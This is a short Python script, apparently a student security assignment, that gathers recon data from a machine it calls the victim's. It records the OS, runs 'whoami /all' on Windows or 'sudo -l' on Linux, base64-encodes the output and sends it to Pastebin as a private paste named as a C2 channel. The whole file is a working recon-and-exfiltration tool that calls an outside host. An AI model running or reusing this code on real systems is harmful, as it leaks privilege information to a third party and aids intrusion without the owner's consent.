# 2301852581 - Delvin Nicholas
# Referensi : README.MD

import requests, base64, platform
from subprocess import PIPE, Popen

from requests.api import post

API_URL = 'https://pastebin.com/api/api_post.php'
API_KEY = "<DEVELOPER_API_KEY>"

# print("Recon Results :")
message = "Recon results\n===========\n"

message += f"Victim's OS: {platform.platform()}\n"

# Check what OS
if platform.system() == "Windows":
    # check user, group, & privileges information
    scan = Popen("whoami /all", stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
    result, err = scan.communicate()

else: # Kalau Linux
    # check privileges
    scan = Popen("sudo -l", stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
    result, err = scan.communicate()

if result == b"":
    message += err.decode()
else:
    message += result.decode()

# Encode to base64
result64 = base64.b64encode(message.encode('utf-8'))
print(result64)
pb_data = {
    'api_dev_key': API_KEY,
    'api_option': 'paste',
    'api_paste_code': result64,
    'api_paste_name': 'C2 Pastebin PPT',
    'api_paste_private': 1
}

send = post(API_URL, data=pb_data)
print(f"Status code: {send.status_code}")
print(f"Pastebin Link : {send.text}")